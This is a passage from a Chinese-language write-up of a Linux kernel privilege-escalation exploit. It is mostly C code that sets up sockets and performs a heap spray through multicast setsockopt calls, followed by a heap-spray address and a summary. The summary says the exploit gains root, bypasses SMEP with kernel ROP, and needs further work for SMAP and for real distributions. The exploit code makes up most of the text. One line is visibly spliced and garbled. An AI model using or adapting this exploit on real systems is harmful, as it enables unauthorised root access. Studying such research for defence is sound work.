            exit(1);
        }
        int opt =1;
        setsockopt(server_socket, SOL_IP, MCAST_JOIN_GROUP, &group, sizeof (group));
        if( bind(server_socket,(struct sockaddr*)&server_addr,sizeof(server_addr))){
            printf("[Server]Server Bind Port : %d Failed!", HELLO_WORLD_SERVER_PORT); 
            exit(1);
        }
        if ( listen(server_socket, 10) ) {
            printf("[Server]Server Listen Failed!"); 
            exit(1);
        }
        pthread_t id_client;
        pthread_create(&id_client,NULL,client,NULL);
        spray_init();
        struct sockaddr_in client_addr;
        socklen_t length = sizeof(client_addr);
        printf ("[Server]accept..... \n"); 
        int new_server_socket = accept(server_socket,(struct sockaddr*)&client_addr,&length);
        if ( new_server_socket sin_family = AF_INET;
        psin->sin_addr.s_addr = htonl(inet_addr("10.10.2.224"));
        for(int i=0; i<SPRAY_SIZE; i++) {
            if ((sockfd[i] = socket(PF_INET6, SOCK_STREAM, 0)) < 0) {      
               perror("Socket");
               exit(errno);
            }
            setsockopt(sockfd[i], SOL_IP, MCAST_JOIN_GROUP, &group, sizeof (group));
        }
    }
    void heap_spray(){
        struct ip_mreq_source mreqsrc;
        memset(&mreqsrc,0,sizeof(mreqsrc));
        mreqsrc.imr_multiaddr.s_addr = htonl(inet_addr("10.10.2.224"));
        for(int j=0; j<SPRAY_SIZE; j++) {     
            setsockopt(sockfd[j], IPPROTO_IP, IP_ADD_SOURCE_MEMBERSHIP, &mreqsrc, sizeof(mreqsrc));
        }
    }
除了修改堆喷方法之外，还需修改堆喷地址，即：
    #define Heap_Spray_Addr            0x000000010000000a
修改好之后我们的exp照样能够成功提权，因此该堆喷方法是可行的。至此，我们成功找到一个不需要patch
kernel的堆喷方法，内核中应该还有很多类似的堆喷方法。
## 0x02 小结
本篇文章中，我们利用内核ROP绕过了SMEP防护机制，同时找到了一种可靠的堆喷方法。但是目前为止我们的exp还不能绕过SMAP，因为SMAP将阻止我们的exp从内核访问用户空间的伪造对象。如果使用ret2dir方法应该可以同时绕过SMEP和SMAP，还需后续研究。还有另外一种方法就是在内核空间中伪造`ip_mc_socklist`，而不是在用户空间伪造。同时，我们的exp只是在qemu的虚拟环境中测试通过，在实际的linux发行版本未做测试。如果要在Ubuntu等系统上提权，还需要通过gdb调试并修改exp。